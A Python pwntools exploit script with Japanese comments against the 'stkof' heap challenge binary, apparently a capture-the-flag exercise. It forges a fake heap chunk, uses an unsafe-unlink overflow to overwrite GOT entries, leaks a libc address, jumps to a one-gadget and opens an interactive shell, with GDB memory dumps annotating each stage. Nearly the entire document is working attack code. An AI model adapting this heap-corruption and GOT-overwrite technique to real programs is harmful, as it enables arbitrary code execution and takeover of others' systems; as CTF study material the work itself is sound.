#!/usr/bin/env python3 
from pwn import *
import warnings
warnings.simplefilter("ignore")

target = process("./stkof_patched")
#gdb.attach(target, gdbscript="b *0x400ba9")
elf = ELF("stkof_patched")

def malloc(size):
    target.sendline("1")
    target.sendline(str(size))
    print(target.recvuntil("\n"))
    print(target.recvuntil("\n"))

def free(index):
    target.sendline("3")
    target.sendline(str(index))
    print(target.recvuntil("\n"))

#入力の\nを省いているので標準入力に\nが残ったままになる
#editの後FAILが出るのは想定内
def edit(index, content):
    target.sendline("2")
    target.sendline(str(index))
    #print(str(len(content) + 1))
    target.sendline(str(len(content)))
    target.sendline(content)
    print(target.recvuntil("\n"))
    print(target.recvuntil("\n"))

def leak(index):
    target.sendline("4")
    target.sendline(str(index))
    address = target.recvline()[:-1]
    print(target.recvuntil("\n"))
    return address

malloc(0xa0)
malloc(0xa0)
malloc(0xa0)
malloc(0xa0) # ここにfake chunk
malloc(0xa0)
malloc(0xa0)

"""
bssにmallocで確保したアドレスが格納されてる
0x602148:       0x02d08020      0x00000000      0x02d084e0      0x00000000
0x602158:       0x02d08590      0x00000000      0x02d08640      0x00000000 ← fake chunk
0x602168:       0x02d086f0      0x00000000      0x02d087a0      0x00000000
"""
ptr = 0x602160

#4番目のチャンクのprev sizeとsize(0x10バイト分)下にfakeを作る
fake =  p64(0x0)                        # prev size
fake += p64(0xa0)                       # size 
fake += p64(ptr - 0x8 * 3)              # 0x602148 bss配列の先頭 fake前のチャンクのアドレス
fake += p64(ptr - 0x8 * 2)              # 0x602150 fake後のチャンクのアドレス
fake += p64(0x0) * int((0xa0 - 0x20) / 8)

# fakechunkの次のチャンクのsizeをオーバーフローで上書き
fake += p64(0xa0)
fake += p64(0xb0)

edit(4, fake)
"""
edit前と後
gef➤  x/100x  0x02d08640-0x10
0x2d08630:      0x00000000      0x00000000      0x000000b1      0x00000000
0x2d08640:      0x00000000      0x00000000      0x00000000      0x00000000
0x2d08650:      0x00000000      0x00000000      0x00000000      0x00000000
[中略]
0x2d086e0:      0x00000000      0x00000000      0x000000b1      0x00000000 ← 5番目の位置 ここまでオーバーフローさせる
0x2d086f0:      0x00000000      0x00000000      0x00000000      0x00000000
   
サイズにある1は使用中のbit
5番目のorev sizeとsizeに未使用bitのサイズを書き込むことでfreeしたときに統合させる

gef➤  x/100x  0x02d08640-0x10
0x2d08630:      0x00000000      0x00000000      0x000000b1      0x00000000
0x2d08640:      0x00000000      0x00000000      0x000000a0      0x00000000
0x2d08650:      0x00602148      0x00000000      0x00602150      0x00000000
0x2d08660:      0x00000000      0x00000000      0x00000000      0x00000000
[中略]
0x2d086e0:      0x000000a0      0x00000000      0x000000b0      0x00000000
0x2d086f0:      0x00000000      0x00000000      0x00000000      0x00000000
    ↑ freeに渡すのはこの位置のアドレス(5番目の位置)
freeに渡されるアドレスはユーザー空間のアドレスだよ
"""
free(5)
"""
gef➤  x/106x 0x02a06640-0x10
0x2a06630:      0x00000000      0x00000000      0x000000b1      0x00000000
0x2a06640:      0x00000000      0x00000000      0x00000151      0x00000000
0x2a06650:      0xd93c5b78      0x00007f01      0xd93c5b78      0x00007f01 ← main_arena
0x2a06660:      0x00000000      0x00000000      0x00000000      0x00000000
[中略]
0x2a066e0:      0x000000a0      0x00000000      0x000000b0      0x00000000 ← オーバーフローさせた5番目
0x2a066f0:      0x00000000      0x00000000      0x00000000      0x00000000
[中略]
0x2a06790:      0x00000150      0x00000000      0x000000b0      0x00000000 ← このb0は6番目 freeされたのでbitが0に
0x2a067a0:      0x00000000      0x00000000      0x00000000      0x00000000

5番目とfakeが統合されて150sizeに

free直後のbss(このあと5番目の0x18ec6f0はNULLになる)
0x602140:       0x00000000      0x00000000      0x018ec020      0x00000000
0x602150:       0x018ec4e0      0x00000000      0x018ec590      0x00000000
0x602160:       0x00602148      0x00000000      0x018ec6f0      0x00000000
0x602170:       0x018ec7a0      0x00000000      0x00000000      0x00000000
"""

#4番目の位置は上のfreeですでに0x602148を指しているのでそこにgotを書き込む
edit(4, p64(elf.got["strlen"]) + p64(elf.got["malloc"]))
#書き込んだstrlenのgotにputsのシンボルを書き込む
edit(1, p64(elf.symbols["puts"]))

malloc_address = u64(leak(2) + b"\x00" * 2)
libc_base = malloc_address - 0x84130
print("malloc: ", hex(malloc_address))
print("libc  : ", hex(libc_base))

#oneshot作ってもう一回mallocを呼ぶ
oneshot = libc_base + 0xf02a4
edit(2, p64(oneshot))

target.sendline("1")
target.sendline("2")

target.interactive()